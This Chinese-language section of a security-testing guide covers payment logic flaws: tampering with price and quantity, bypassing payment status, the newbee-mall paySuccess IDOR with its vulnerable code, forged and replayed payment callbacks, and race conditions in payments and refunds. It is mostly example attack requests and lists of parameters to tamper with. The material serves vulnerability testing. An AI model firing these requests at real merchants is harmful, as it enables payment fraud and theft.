## 二、支付与交易漏洞深度利用

### 2.1 0元支付/负数支付/价格篡改

**核心原则：服务端信任了客户端提交的金额/价格/数量/折扣/积分抵扣参数。**

```
1. 直接修改价格参数：
POST /pay {"product_id":1,"price":0.01,"amount":1}   → price 改为 0 或负数
POST /pay {"total":100,"items":[{"price":10,"qty":10}]} → 修改 items 价格
POST /pay {"amount":-1,"product_id":1}                → 负数支付（余额反而增加）
POST /pay {"amount":0}                                 → 0 元支付

2. 数量篡改：
POST /order {"product_id":1,"quantity":-1}        → 负数数量导致总价为负（反向入账）
POST /order {"product_id":1,"quantity":999999999} → 整数溢出
POST /order {"product_id":1,"quantity":0.1}       → 小数数量（总价向下取整）

3. 折扣/抵扣篡改：
POST /apply-coupon {"code":"FREE100","discount":100}  → 修改折扣值
POST /pay {"discount":999,"total":100}                 → total - discount = 负数
POST /pay {"point_deduction":999999}                   → 积分抵扣超过订单金额
POST /pay {"shipping_fee":0}                           → 运费置零/负数

4. 支付金额与订单金额不匹配：
先生成订单 100 元 → 支付时修改支付金额为 0.01 → 支付成功后订单状态变为已支付
（服务端必须用订单号回查数据库金额，而不是用客户端传的金额）

5. 隐藏参数挖掘：
价格计算常由"隐藏参数"驱动，用 Arjun/Param Miner 挖掘：
POST /cart {"product_id":699,"qty":1,"id_product_feature_set":""}
→ 2025 真实案例：某电商 id_product_feature_set 参数置空后 €699 商品变 €0（$2,000 bounty）
```

**完整测试参数清单：** `price`、`amount`、`total`、`subtotal`、`discount`、`coupon`、`shipping`、`tax`、`fee`、`point`、`credit`、`balance`、`quantity`、`unit_price`、`currency`、`exchange_rate`、`promo_code`、`is_free`、`gift`。

### 2.2 支付流程绕过

```http
# 支付流程：创建订单 → 支付 → 回调确认 → 更新状态
# 攻击面 1：直接访问支付成功页/回调 URL 触发订单完成
GET /payment/success?order_id=123&status=success
GET /payment/callback?out_trade_no=xxx&trade_status=TRADE_SUCCESS

# 攻击面 2：修改支付状态参数
POST /order/pay {"order_id":123,"status":"PAID"}
POST /order/pay {"order_id":123,"paid":true}

# 攻击面 3：替换支付交易 ID 为他人成功交易 ID
POST /payment/callback {"out_trade_no":"自己订单","trade_no":"他人成功支付的trade_no"}

# 攻击面 4：并发支付（重复扣款/重复发货）
同时发送多个支付请求 → 同订单多次扣款、同商品多次发货、余额只扣一次但生成多订单
```

### 2.3 支付确认 IDOR（高危高频，2025 实测案例）

**2025 年 9 月 newbee-mall `/paySuccess` 漏洞（公开披露）：**
```java
@GetMapping("/paySuccess")
public Result paySuccess(@RequestParam("orderNo") String orderNo, @RequestParam("payType") int payType) {
    // 无任何认证/授权检查，直接用客户端 orderNo 更新订单状态为已支付
    NewBeeMallOrder order = mapper.selectByOrderNo(orderNo);
    order.setOrderStatus(PAID); order.setPayTime(new Date());
    mapper.updateByPrimaryKeySelective(order);
}
```

```http
# 利用：任意登录用户可直接把任意订单（含他人订单）标记为已支付 → 0 元购 + 水平越权
GET /paySuccess?payType=2&orderNo=15692218454123239
Cookie: JSESSIONID=<任意登录用户的session>
```

**测试方法：**
```
1. 寻找"前端主动通知后端支付成功"的端点（paySuccess/payResult/notify/success 类）
2. 检查该端点是否依赖第三方签名/服务端回查 → 若无，直接可伪造
3. 用他人订单号测试是否水平越权
4. 观察订单状态是否真的被更新为已支付
```

### 2.4 第三方支付回调伪造

```
1. 无签名验证：直接 POST 回调数据，构造 TRADE_SUCCESS 即可入账
2. 签名密钥泄露：从前端代码/JS bundle/配置接口/测试环境获取密钥后伪造签名
3. 签名绕过：
   - 删除签名字段（某些 SDK 对缺失签名不校验）
   - 签名算法降级（rsa → md5 → 空）
   - 参数名大小写/加解密编码差异（如 URL 编码、大小写敏感绕过签名拼接）
   - 重放合法回调（同一条成功回调重放 N 次 → N 次入账，若未做幂等）
4. 测试环境签名 key：测试环境 key 常为公开固定值且可通用于生产
5. 来源 IP 不验证：从任意 IP 发送回调
6. 回调字段篡改：改 amount/order_id/trade_status 后自签名重放
7. 异步 vs 同步回调差异：异步通知未验签但同步页面验签，攻击异步通道
```

**回调伪造利用链（0 元购典型）：**
```
1. 正常下单生成订单（不支付）
2. 伪造回调：POST /pay/notify {"order_id":"X","amount":"0.01","trade_status":"TRADE_SUCCESS","sign":"..."}
3. 若未验签/验签可绕过 → 订单状态变已支付 → 发货
4. 进阶：并发重放同一回调 → 重复入账/重复发货（结合幂等缺失）
```

### 2.5 金额精度与边界值

```
1. 浮点精度：
   0.1+0.2=0.30000000000000004 → 累积微小误差（大量小额订单四舍五入窃取"分"）
   金额用 float/double 而非 BigDecimal/整数分 → 精度攻击
2. 最小支付边界：微信/支付宝最小支付 0.01 → 测 0.00 / 0.001 / -0.01
3. 超大金额溢出：99999999999999999999 → 溢出为负数/0
4. 分/元换算：传 1 元实扣 0.01 分（单位混淆：amount 单位是元还是分，前后不一致）
5. 币种/汇率：修改 currency 或汇率参数（跨境支付），USD→本地币种结算差异
```

### 2.6 并发支付与重复退款（Double-Spend）

```
1. 同订单并发支付 N 次：扣款 N 次 or 只扣 1 次但状态全成功？
2. 退款并发 N 次：每次校验"已支付"通过后并发退 → 退款 N 次（BLA1 限额超限）
3. 退款金额 > 实付金额：改退款金额参数
4. 支付与退款并发：支付中退款 → 状态机不一致
5. 转账并发：A→B 并发转 100 元两次 → A 只扣一次，B 到账两次？
6. 余额提现并发：余额 100 元并发提现 100 元 N 次 → 余额为负？
7. 优惠券/兑换码并发兑换：同一兑换码并发兑换 → 兑换多次？（竞态详见第三章）
```

